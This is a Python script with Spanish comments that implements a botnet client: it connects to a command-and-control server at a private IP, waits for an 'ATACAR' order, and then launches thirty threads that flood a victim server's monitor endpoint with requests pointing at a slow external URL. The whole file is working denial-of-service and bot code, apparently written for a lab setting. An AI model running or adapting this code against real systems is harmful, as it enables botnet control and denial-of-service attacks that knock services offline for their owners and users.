import socket
import time
import requests
import threading

# --- Configuración del Bot ---
CNC_HOST = "192.168.0.17" # <-- IP DEL C&C DEL ASISTENTE
CNC_PORT = 9999

# Servidor víctima
VICTIM_IP = "192.168.0.18" # <-- IP DEL SERVIDOR VÍCTIMA
VICTIM_PORT = 80
VICTIM_URL =f"http://{VICTIM_IP}:{VICTIM_PORT}/monitor?target=https://httpbin.org/delay/5" 
def attack_thread():
    """Hilo que ataca al objetivo en un bucle infinito."""
    print("HILO DE ATAQUE: ¡Iniciado! Atacando...")
    while True:
        try:
            requests.get(VICTIM_URL, timeout=5, data="")
            pass
        except:
            pass

def attack():
    # 1. Creamos una lista para guardar los hilos
    hilos = []

    # 2. Creamos los hilos (pero no los iniciamos aún)
    for _ in range(30):
        hilo = threading.Thread(target=attack_thread)
        hilos.append(hilo)

    # 3. Iniciamos todos los hilos (esto es el ataque)
    for hilo in hilos:
        hilo.start()

    # 4. Esperamos a que todos los hilos terminen
    for hilo in hilos:
        hilo.join()


def start_cnc_connection():
    """Función principal para conectar al C&C y esperar órdenes."""
    print(f"BOT: Iniciado. Conectando a C&C en {CNC_HOST}:{CNC_PORT}...")
    
    while True: # Bucle para reconexión
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((CNC_HOST, CNC_PORT))
                print("BOT: Conectado al C&C. Esperando órdenes.")
                
                # Espera la orden de ATACAR
                data = s.recv(1024)
                
                if data.strip() == b'ATACAR':
                    print("BOT: ¡Orden de ATACAR recibida!")
                
                attack()
            
        except Exception as e:
            print(f"BOT: Error o C&C no disponible ({e}). Reintentando en 10s...")
            time.sleep(10)

if __name__ == "__main__":
    start_cnc_connection()
